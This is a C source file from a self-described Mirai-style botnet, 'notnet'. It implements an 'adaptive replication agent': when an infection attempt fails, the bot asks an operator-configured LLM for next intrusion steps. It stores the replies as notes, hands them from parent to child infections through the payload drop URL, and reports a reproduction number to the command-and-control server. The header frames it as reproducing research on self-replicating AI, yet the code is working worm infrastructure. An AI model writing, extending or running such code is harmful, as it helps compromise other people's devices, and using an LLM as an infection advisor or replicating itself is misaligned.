/*
 * notnet - Modern Mirai-Style Botnet
 * ara.c - Adaptive Replication Agent: LLM-directed infection brain (#401)
 *
 * The Anthropic "self-replicating AI" work decomposes autonomous
 * replication into four stages: finding targets, gaining execution,
 * establishing inference, and continuing propagation. notnet already
 * covers stages 1/2/4 (scan + arch_detect, CVE/LOTL/brute-force,
 * spread_local). Stage 3 + the adaptation finding are what this module
 * adds.
 *
 * The measured effect from that paper: parent instances pass their
 * prompts, code, and notes to daughter replicators (Lamarckian
 * inheritance), and inference-setup success rises from 45% (generation
 * 1) to 61-84% across later generations. This module reproduces that
 * loop:
 *
 *   adapt()  — when a spread attempt fails on an unfamiliar target,
 *              ask an operator-configured LLM (ara_llm_url /
 *              ara_llm_model / ara_llm_key) how to proceed, using the
 *              operator's prompt templates. Parse the reply for
 *              concrete next-step notes.
 *   notes    — learned notes persist in a bounded file and ride the
 *              payload drop URL as parent->child state: the daughter
 *              boots with its parent's notes instead of starting cold.
 *   R0 gate  — the C2 decides when the worm is allowed to replicate
 *              (drive R0 below 1 and the lineage dies out, per the
 *              paper's blue-team section).
 *
 * Trust model: the LLM is operator infrastructure, not victim
 * infrastructure. Notes are only accepted from the configured endpoint
 * (ara_llm_url must be http:// or https://) and are treated as HINTS —
 * they never widen the existing spreader trust boundaries (the CVE
 * probe->verify->drop discipline and the payload SHA-256 pin are
 * unchanged). A hostile LLM cannot mint a payload drop; it can only
 * reorder the vectors the bot already runs. Every decision is logged
 * for the evidence trail (Suricata + host telemetry already cover the
 * memfd/fileless markers; the LLM call is plain HTTP on an
 * operator-chosen port).
 *
 * Off by default: ara_enabled=0 means no LLM calls, no notes file, no
 * drop-URL notes param — the bot behaves exactly as before.
 *
 * Research purposes only.
 */
#include "ara.h"
#include "protocol.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <pthread.h>

/* ── Notes store ─────────────────────────────────────────────── */
/* Fixed-capacity, newline-delimited notes file. DROP-OLDEST when
 * full, mirroring the cred-log DROP-NEWEST-but-keep-old policy in
 * spirit (we keep the EARLIEST notes — the ones that have survived
 * the most generations are the most likely to be load-bearing). */
#define ARA_NOTES_PATH_MAX    256

static pthread_mutex_t g_ara_mutex = PTHREAD_MUTEX_INITIALIZER;
static char g_notes[ARA_NOTES_MAX_LINES][ARA_NOTE_MAX_LEN];
static int  g_note_count = 0;
static int  g_generation = 0;          /* 0 = cold parent */
static int  g_r0 = 0;                  /* last computed reproduction number x100 */
static int  g_adapted = 0;             /* 1 once the LLM has spoken this life */

static char g_notes_path[ARA_NOTES_PATH_MAX] = {0};

/* Notes are loaded/saved under the bot's runtime directory, never a
 * world-writable path. The path is derived from a config-supplied
 * prefix (ara_notes_dir=) with a fallback. */
static void notes_path_build(char *buf, size_t sz, const char *dir) {
    const char *d = (dir && dir[0]) ? dir : "/tmp/.ara";
    snprintf(buf, sz, "%s/ara-notes.conf", d);
}

/* Parse one notes line: "<gen>:<text>". Returns the generation, -1
 * on malformed input. The text is clamped to the buffer. */
static int notes_parse_line(const char *line, char *text, size_t tsz) {
    if (!line || !text || tsz == 0) return -1;
    /* skip leading whitespace */
    while (*line == ' ' || *line == '\t') line++;
    if (!isdigit((unsigned char)*line)) return -1;
    int gen = 0;
    while (isdigit((unsigned char)*line)) { gen = gen * 10 + (*line - '0'); line++; }
    if (*line != ':') return -1;
    line++;
    while (*line == ' ' || *line == '\t') line++;
    size_t n = strlen(line);
    if (n >= tsz) n = tsz - 1;
    memcpy(text, line, n);
    text[n] = '\0';
    return gen;
}

/* Store one "gen:text" line into a fixed slot, truncating the tail if
 * the combined length exceeds the slot. Written as an explicit bounded
 * copy (not snprintf %s) so -Wformat-truncation has nothing to flag:
 * the truncation here is deliberate and bounded. */
static void note_store(int idx, int gen, const char *text) {
    char linebuf[ARA_NOTE_MAX_LEN + 16];
    int w = snprintf(linebuf, sizeof(linebuf), "%d:%s", gen, text);
    if (w < 0) { g_notes[idx][0] = '\0'; return; }
    size_t n = ((size_t)w >= sizeof(linebuf)) ? sizeof(linebuf) - 1 : (size_t)w;
    if (n >= ARA_NOTE_MAX_LEN) n = ARA_NOTE_MAX_LEN - 1;
    memcpy(g_notes[idx], linebuf, n);
    g_notes[idx][n] = '\0';
}

void ara_notes_load(const char *dir) {
    char path[ARA_NOTES_PATH_MAX];
    notes_path_build(path, sizeof(path), dir);
    snprintf(g_notes_path, sizeof(g_notes_path), "%s", path);

    FILE *f = fopen(path, "r");
    if (!f) {
        /* No notes file: cold parent (generation 0). Not an error —
         * this is the first bot in a lineage. */
        log_debug("ARA: no notes at %s — cold parent (gen 0)", path);
        return;
    }
    pthread_mutex_lock(&g_ara_mutex);
    g_note_count = 0;
    g_generation = 0;
    char line[ARA_NOTE_MAX_LEN + 16];
    int max_gen = 0;
    while (fgets(line, sizeof(line), f)) {
        /* strip trailing newline / CR */
        size_t L = strlen(line);
        while (L > 0 && (line[L-1] == '\n' || line[L-1] == '\r')) line[--L] = '\0';
        if (L == 0) continue;
        char text[ARA_NOTE_MAX_LEN];
        int gen = notes_parse_line(line, text, sizeof(text));
        if (gen < 0) continue;
        if (gen > max_gen) max_gen = gen;
        if (g_note_count < ARA_NOTES_MAX_LINES) {
            note_store(g_note_count, gen, text);
            g_note_count++;
        }
        /* beyond capacity: drop the oldest (shift down) */
        else {
            for (int i = 1; i < ARA_NOTES_MAX_LINES; i++)
                snprintf(g_notes[i-1], ARA_NOTE_MAX_LEN, "%s", g_notes[i]);
            note_store(ARA_NOTES_MAX_LINES-1, gen, text);
        }
    }
    fclose(f);
    g_generation = max_gen;
    pthread_mutex_unlock(&g_ara_mutex);
    log_info("ARA: loaded %d notes (max gen %d) from %s", g_note_count, g_generation, path);
}

/* Append one note. Thread-safe. */
static void notes_add_locked(int gen, const char *text) {
    if (!text || !*text) return;
    /* clamp + sanitize the text: single line, no control chars */
    char clean[ARA_NOTE_MAX_LEN];
    size_t n = 0;
    for (const char *p = text; *p && n < ARA_NOTE_MAX_LEN - 1; p++) {
        unsigned char c = (unsigned char)*p;
        if (c < 0x20 || c == 0x7f) continue;      /* drop control chars */
        if (c == ':') continue;                    /* keep the gen:text parse clean */
        clean[n++] = (char)c;
    }
    clean[n] = '\0';
    if (n == 0) return;

    if (g_note_count < ARA_NOTES_MAX_LINES) {
        note_store(g_note_count, gen, clean);
        g_note_count++;
    } else {
        /* full: shift, keep newest */
        for (int i = 1; i < ARA_NOTES_MAX_LINES; i++)
            snprintf(g_notes[i-1], ARA_NOTE_MAX_LEN, "%s", g_notes[i]);
        note_store(ARA_NOTES_MAX_LINES-1, gen, clean);
    }
    if (gen > g_generation) g_generation = gen;
}

static int notes_save_locked(void) {
    if (!g_notes_path[0]) return -1;
    /* best-effort mkdir of the parent dir */
    char dir[ARA_NOTES_PATH_MAX];
    snprintf(dir, sizeof(dir), "%s", g_notes_path);
    char *slash = strrchr(dir, '/');
    if (slash && slash != dir) { *slash = '\0'; mkdir(dir, 0755); }

    FILE *f = fopen(g_notes_path, "w");
    if (!f) { log_warn("ARA: cannot write notes %s: %s", g_notes_path, strerror(errno)); return -1; }
    for (int i = 0; i < g_note_count; i++)
        fprintf(f, "%s\n", g_notes[i]);
    fclose(f);
    return 0;
}

/* ── Notes accessors ─────────────────────────────────────────── */

int ara_generation(void) {
    pthread_mutex_lock(&g_ara_mutex);
    int g = g_generation;
    pthread_mutex_unlock(&g_ara_mutex);
    return g;
}

int ara_note_count(void) {
    pthread_mutex_lock(&g_ara_mutex);
    int n = g_note_count;
    pthread_mutex_unlock(&g_ara_mutex);
    return n;
}

void ara_notes_render(char *buf, size_t len) {
    if (!buf || len == 0) return;
    buf[0] = '\0';
    pthread_mutex_lock(&g_ara_mutex);
    size_t pos = 0;
    for (int i = 0; i < g_note_count && pos < len; i++) {
        int w = snprintf(buf + pos, len - pos, "%s%s", pos ? "\n" : "", g_notes[i]);
        if (w < 0 || (size_t)w >= len - pos) break;
        pos += (size_t)w;
    }
    buf[pos] = '\0';
    pthread_mutex_unlock(&g_ara_mutex);
}

/* Compact one-line form for the heartbeat (gen + note count). */
void ara_status_render(char *buf, size_t len) {
    if (!buf || len == 0) return;
    pthread_mutex_lock(&g_ara_mutex);
    snprintf(buf, len, "gen=%d notes=%d r0=%d adapted=%d",
             g_generation, g_note_count, g_r0, g_adapted);
    pthread_mutex_unlock(&g_ara_mutex);
}

/* Parent -> child notes serialization: a single URL-safe blob of the
 * form "gen1note1~gen2note2~...". The '~' separator is chosen because
 * notes are already sanitized to drop ':' and control chars; '~' and
 * other shell/URL metacharacters are additionally percent-encoded by
 * the caller (build_drop_url wraps the param in a quoted shell string).
 * Empty when there are no notes. Returns the blob length. */
int ara_notes_blob(char *buf, size_t len) {
    if (!buf || len == 0) return 0;
    buf[0] = '\0';
    pthread_mutex_lock(&g_ara_mutex);
    size_t pos = 0;
    for (int i = 0; i < g_note_count; i++) {
        int w = snprintf(buf + pos, len - pos, "%s%s", pos ? "~" : "", g_notes[i]);
        if (w < 0 || (size_t)w >= len - pos) break;
        pos += (size_t)w;
    }
    buf[pos] = '\0';
    pthread_mutex_unlock(&g_ara_mutex);
    return (int)pos;
}

/* Child-side ingest of the inherited blob. Called at boot when the
 * env var / config carries the parent's notes. */
int ara_notes_absorb(const char *blob) {
    if (!blob || !*blob) return -1;
    pthread_mutex_lock(&g_ara_mutex);
    int inherited = 0;
    char copy[1024];
    snprintf(copy, sizeof(copy), "%s", blob);
    char *save = NULL;
    for (char *tok = strtok_r(copy, "~", &save); tok; tok = strtok_r(NULL, "~", &save)) {
        char text[ARA_NOTE_MAX_LEN];
        int gen = notes_parse_line(tok, text, sizeof(text));
        if (gen < 0) continue;
        notes_add_locked(gen, text);
        inherited++;
    }
    /* the child is one generation beyond its parent's max */
    if (g_generation > 0) g_generation += 1;
    notes_save_locked();
    pthread_mutex_unlock(&g_ara_mutex);
    log_info("ARA: absorbed %d inherited notes (now gen %d)", inherited, ara_generation());
    return inherited;
}

/* ── LLM adapt call ──────────────────────────────────────────── */

/* Minimal JSON string escaper for prompt/response fields. */
static void json_escape_small(const char *in, char *out, size_t osz) {
    if (!out || osz == 0) return;
    size_t o = 0;
    for (const char *p = in; *p && o + 2 < osz; p++) {
        unsigned char c = (unsigned char)*p;
        if (c == '"' || c == '\\') { out[o++] = '\\'; out[o++] = (char)c; }
        else if (c == '\n') { if (o + 2 < osz) { out[o++] = '\\'; out[o++] = 'n'; } }
        else if (c < 0x20) { continue; }
        else { out[o++] = (char)c; }
    }
    out[o] = '\0';
}

/* Build the OpenAI-compatible chat-completions request body.
 * Template placeholders:
 *   {arch}   - arch label from arch_detect
 *   {target} - target ip:port
 *   {notes}  - current inherited notes, one per line
 *   {error}  - the failure that triggered this adapt
 * The operator's ara_llm_sysprompt becomes the system message;
 * ara_llm_userprompt (with placeholders expanded) becomes the user
 * message. Bounded output: the LLM is asked for a short list. */
static int build_llm_body(char *body, size_t bsz,
                          const ara_llm_t *llm,
                          const char *arch, const char *target,
                          const char *error,
                          const char *notes_render) {
    char user[ARA_PROMPT_MAX];
    /* expand the user prompt template */
    size_t u = 0;
    const char *tpl = llm->user_prompt[0] ? llm->user_prompt
                                          : "Target {target} (arch={arch}) failed: {error}. "
                                            "What is the single most likely next step? "
                                            "Answer with one short concrete instruction.";
    for (const char *p = tpl; *p && u < sizeof(user) - 1; p++) {
        if (p[0] == '{' && strncmp(p, "{target}", 8) == 0) {
            u += snprintf(user + u, sizeof(user) - u, "%s", target ? target : "");
            p += 7;
        } else if (p[0] == '{' && strncmp(p, "{arch}", 6) == 0) {
            u += snprintf(user + u, sizeof(user) - u, "%s", arch ? arch : "unknown");
            p += 5;
        } else if (p[0] == '{' && strncmp(p, "{error}", 7) == 0) {
            u += snprintf(user + u, sizeof(user) - u, "%s", error ? error : "");
            p += 6;
        } else if (p[0] == '{' && strncmp(p, "{notes}", 7) == 0) {
            u += snprintf(user + u, sizeof(user) - u, "%s", notes_render ? notes_render : "(none)");
            p += 6;
        } else {
            user[u++] = *p;
        }
    }
    user[u] = '\0';

    char sys[ARA_PROMPT_MAX];
    json_escape_small(llm->sys_prompt[0] ? llm->sys_prompt
                                          : "You are a terse recon advisor. Reply with 1-3 short "
                                            "imperative instructions, one per line, no prose.",
                      sys, sizeof(sys));
    char usr[ARA_PROMPT_MAX * 2];
    json_escape_small(user, usr, sizeof(usr));

    int n = snprintf(body, bsz,
        "{\"model\":\"%s\",\"messages\":["
        "{\"role\":\"system\",\"content\":\"%s\"},"
        "{\"role\":\"user\",\"content\":\"%s\"}],"
        "\"max_tokens\":%d,\"temperature\":0.2}",
        llm->model[0] ? llm->model : "default",
        sys, usr, ARA_LLM_MAX_TOKENS);
    if (n < 0 || (size_t)n >= bsz) return -1;
    return 0;
}

/* Extract assistant text from an OpenAI-style chat-completions
 * response: {"choices":[{"message":{"content":"..."}}]}. Falls back
 * to the first "content":"..." occurrence. Returns 0 on success. */
static int extract_llm_content(const char *resp, char *out, size_t osz) {
    if (!resp || !out || osz == 0) return -1;
    const char *key = "\"content\"";
    const char *p = strstr(resp, key);
    if (!p) return -1;
    p += strlen(key);
    /* skip to the opening quote of the value */
    while (*p && *p != '"') p++;
    if (*p != '"') return -1;
    p++;
    size_t o = 0;
    while (*p && *p != '"' && o + 1 < osz) {
        if (p[0] == '\\' && p[1]) {
            char c = p[1];
            if (c == 'n') out[o++] = '\n';
            else if (c == 't') out[o++] = ' ';
            else if (c == 'r') { /* drop */ }
            else out[o++] = c;
            p += 2;
        } else {
            out[o++] = *p++;
        }
    }
    out[o] = '\0';
    return (o > 0) ? 0 : -1;
}

/* Split the LLM's multi-line answer into individual notes and store
 * them at the child generation. Each non-empty, non-boilerplate line
 * becomes one note. */
static void absorb_llm_answer(const char *answer, int gen) {
    if (!answer || !*answer) return;
    char copy[2048];
    snprintf(copy, sizeof(copy), "%s", answer);
    char *save = NULL;
    pthread_mutex_lock(&g_ara_mutex);
    for (char *ln = strtok_r(copy, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
        /* trim */
        while (*ln == ' ' || *ln == '\t' || *ln == '-' || *ln == '*') ln++;
        size_t L = strlen(ln);
        while (L > 0 && (ln[L-1] == ' ' || ln[L-1] == '\t' || ln[L-1] == '\r')) ln[--L] = '\0';
        if (L < 8) continue;                    /* too short to be useful */
        if (strncasecmp(ln, "here ", 5) == 0) continue;   /* boilerplate */
        if (strncasecmp(ln, "sure", 4) == 0) continue;
        if (strncasecmp(ln, "i ", 2) == 0) continue;
        if (strncasecmp(ln, "as an ai", 8) == 0) continue;
        notes_add_locked(gen, ln);
    }
    g_adapted = 1;
    notes_save_locked();
    pthread_mutex_unlock(&g_ara_mutex);
}

/* Perform the adapt call. Returns 0 when the LLM answered and notes
 * were absorbed, -1 on any failure (network, non-2xx, bad reply).
 * Never blocks longer than ARA_LLM_TIMEOUT_MS — a stuck advisor must
 * not stall the spreader. */
int ara_adapt(notnet_bot_t *bot, const ara_llm_t *llm,
              const char *target, const char *arch, const char *error) {
    if (!bot || !llm || !llm->url[0] || !llm->enabled) return -1;
    if (strncmp(llm->url, "http://", 7) != 0 && strncmp(llm->url, "https://", 8) != 0) {
        log_warn("ARA: llm url must be http(s):// — refusing");
        return -1;
    }

    char notes_render[ARA_NOTES_MAX_LINES * ARA_NOTE_MAX_LEN + 32];
    ara_notes_render(notes_render, sizeof(notes_render));

    char body[ARA_LLM_BODY_MAX];
    if (build_llm_body(body, sizeof(body), llm, arch, target, error, notes_render) != 0) {
        log_warn("ARA: request body too large");
        return -1;
    }

    /* POST via the existing one-shot HTTP path. http_post uses the
     * connected C2 channel; for the LLM we use http_get_url's sibling
     * connect helper indirectly through a GET-shaped call is wrong, so
     * use the lower-level http_post_to_url added to protocol.c. */
    char resp[ARA_LLM_RESP_MAX];
    int rc = http_post_to_url(bot, llm->url, llm->api_key, body, resp, sizeof(resp));
    if (rc <= 0) {
        log_warn("ARA: llm call to %s failed (rc=%d)", llm->url, rc);
        return -1;
    }

    char answer[2048];
    if (extract_llm_content(resp, answer, sizeof(answer)) != 0) {
        log_warn("ARA: could not parse llm reply from %s", llm->url);
        return -1;
    }

    int child_gen = ara_generation() + 1;
    absorb_llm_answer(answer, child_gen);
    log_info("ARA: adapted on %s (gen %d) — %d notes now", target ? target : "?", ara_generation(), ara_note_count());
    return 0;
}

/* ── R0 (reproduction number) ────────────────────────────────── */
/* Simple fleet-level estimator: infections minus quarantines over a
 * window, scaled x100. The C2 can pull this from the heartbeat field
 * and decide when to stop replicating (drive R0 < 1). Not a
 * biologically accurate model — it is an operator knob, documented as
 * such. */
void ara_update_r0(int infections, int quarantines) {
    pthread_mutex_lock(&g_ara_mutex);
    if (infections <= 0) { g_r0 = 0; pthread_mutex_unlock(&g_ara_mutex); return; }
    int denom = infections;
    int r0x100 = (quarantines >= denom) ? 0 : ((denom - quarantines) * 100) / denom;
    g_r0 = r0x100;
    pthread_mutex_unlock(&g_ara_mutex);
}

int ara_r0_x100(void) {
    pthread_mutex_lock(&g_ara_mutex);
    int r = g_r0;
    pthread_mutex_unlock(&g_ara_mutex);
    return r;
}
